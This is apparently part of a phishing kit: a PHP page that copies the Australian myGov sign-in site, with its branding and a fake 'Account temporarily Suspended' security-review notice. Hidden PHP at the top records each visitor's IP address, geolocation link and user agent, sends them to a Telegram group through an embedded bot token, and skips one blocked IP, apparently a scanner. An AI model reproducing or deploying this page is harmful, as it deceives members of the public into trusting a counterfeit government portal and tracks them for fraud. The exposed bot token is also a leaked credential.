<?php
// Telegram Bot API token
$botApiToken = '7377635625:AAGaEhGs_Rk-y_dGbNZg3qzwqbuzw8f0fRQ';

// Telegram group ID where you want to send notifications
$groupId = '-4287461385';

// Array of blocked IP addresses
$blockedIPs = [
    '161.35.121.7',
    // Add more IPs as needed
];

// Function to get visitor's IP address
function getIpAddress() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        // Check IP from shared internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Check IP from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    return $ip;
}

// Function to send notification to Telegram
function sendNotification($message) {
    global $botApiToken, $groupId;

    $telegramApiUrl = "https://api.telegram.org/bot$botApiToken/sendMessage";
    $params = [
        'chat_id' => $groupId,
        'text' => $message,
    ];

    // Use cURL to send POST request to Telegram Bot API
    $ch = curl_init($telegramApiUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

// Get visitor's IP address
$ipAddress = getIpAddress();

// Check if IP is in blocked list
if (in_array($ipAddress, $blockedIPs)) {
    exit; // Exit script if IP is blocked
}

// Get user agent
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

// Construct Telegram message
$locationUrl = "https://ipapi.co/$ipAddress/";
$message = " 

▪ Visitor 🇦🇺 👤
▪ MyGov Login 2 💼

IP = $ipAddress
Location = $locationUrl
User Agent = $userAgent

============================";

// Send notification to Telegram
$response = sendNotification($message);

// Debugging: Print response from Telegram API (optional)
// echo "Response from Telegram API:<br>";
// echo "<pre>" . print_r($response, true) . "</pre>";
?>

<!DOCTYPE html>
<!--[if IE 9]><html class="ie ie9" lang="en"><![endif]-->
<!--[if (gt IE 9)|!(IE)]><!-->
<html lang="en"><!--<![endif]--><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<!--
E: PROD; 
C: MW1w; 
N: MW1w12; 
S: SW12b;  
-->
	<meta charset="utf-8">
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<title>
		Sign in with myGov - myGov
	</title>
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- phone number format detection, turning it off -->
	<meta name="format-detection" content="telephone=no">
	<script type="text/javascript" src="Sign%20in%20with%20myGov%20-%20myGov_files/ruxitagentjs_ICA2NVfghjqrux_10271230920145406.js" data-dtconfig="app=5f15dc81410a75c1|ssc=1|featureHash=ICA2NVfghjqrux|vcv=2|rdnt=0|uxrgce=1|bp=3|cuc=gpalpirq|mel=100000|md=mdcc1=ainput#user-id,mdcc2=adiv.error-msg-text span,mdcc3=aspan[data-home-welcome-message]|ssv=4|lastModification=1722597292543|tp=500,50,0,1|agentUri=/LoginServices/main/ruxitagentjs_ICA2NVfghjqrux_10271230920145406.js|reportUrl=/LoginServices/main/rb_6de8e2e9-6719-45b3-86be-7effcb9f6525|rid=RID_315652661|rpid=-842797597|domain=my.gov.au"></script><link rel="icon" type="image/png" sizes="32x32" href="img/favicon-32x32.png">
  	<link rel="icon" type="image/png" sizes="16x16" href="https://login.my.gov.au/mygov/content/mgv2/icons/favicon-16x16.png">
	<link href="css/css.css" rel="stylesheet">
	<link href="css/mgv2-application.css" rel="stylesheet">
	<link href="css/blugov.css" rel="stylesheet">
</head>

<body><noscript>
	<div class="outage">
		<div class="outage__inner">
			<div>
				<span class="is-visuallyhidden"> Warning message: </span>
				<p> JavaScript is required for myGov to work correctly.</p>
			</div>
		</div>
	</div>
</noscript>




	
		
	
	





<nav class="uikit-skip-link" aria-label="Skip Links">
	<a class="uikit-skip-link__link" href="#content">Skip to main content</a>
</nav>

<div class="brand-rainbow">&nbsp;</div>
<header role="banner" class="mgvEnhanceHeader">
	<section class="wrapper">
		<div class="inner">
			<div class="unauth-grid">
				<div class="unauth-grid-row">
					<a href="https://my.gov.au/" class="unauth-govt-crest__link">
					    <img id="unauth-govt-crest" src="img/myGov-cobranded-logo-black.svg" alt="Australian Government and myGov logo" role="img">
                    </a>

					<div class="header-links">
						<a href="https://my.gov.au/en/about/help">Help</a>
					</div>
				</div>
			</div>
		</div>
	</section>
</header>









<div class="wrapper-mapwap"><div class="main-block" id="content" role="main">
	<div class="unauth">
		<div class="login-grid-container">
			<div class="login-grid-row">
				<div class="login-grid-column">
					<div class="digital-id-login-card-wrapper">
						<div class="digital-id-main-login-card override">
	
						
							
							
							

                            <div id="passkey-auth-error" class="alert alert-danger error-msg" role="alert" style="display: none">
                                <span class="is-visuallyhidden">Error message:</span>
                                <div class="error-msg-text">
                                    <strong>Error</strong>
                                    <br>
                                    <p id="passkey-error-msg">
                                        Passkey authentication failed. (RFMxxx)
                                    </p>
                                </div>
                            </div>

                            <div id="error-msg-container">
                                
                                    
                                    
                                        <div class="error-msg" role="alert" aria-live="assertive"><span class="is-visuallyhidden">Error message:</span>
                                            <div class="error-msg-text"><span>
                                                <strong>Account temporarily Suspended</strong>
                                                
                                                <br><br>
                                                Your account is currently suspended for a security review. This process may take up to 10 business days. <br>Once the review is complete, your access will be automatically restored. There are no actions required on your part. You will be notified by myGov once your account is unlocked.<br><br>any linked services will continue without interruption, and your payments will not be affected.
    
                                                <br>
                                            </span></div>

                                        </div>

                                    
                                    
                                    
                                    
                                        
                                        
                                        
                                        
                                    
                                
                            </div>

							
        <p></p>
        <form action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" method="post" enctype="multipart/form-data" id="otp-entry-form">
            <div class="code-container">
               
                </div> <br>
                <div class="button-container">    			
                    <button type="submit" class="button-main button">Return to myGov</button>
                    
                </div>
                <input type="hidden" name="accountRecovery" value="true" />
                <input type="hidden" name="authtype" value="otp" />
                <input type="hidden" name="_resetMobileEligible" value="" />
                <input type="hidden" name="_fallback" value="" /> 
                <input type="hidden" name="_csrf" value="1955f03c-d798-45c1-8b18-b20ec7445f8f" />
            </div>
        </form>
    </div>
</div>

<script type="text/javascript" src="/mygov/content/mgv2/js/mgv2-application.js"></script>
</body>
</html>
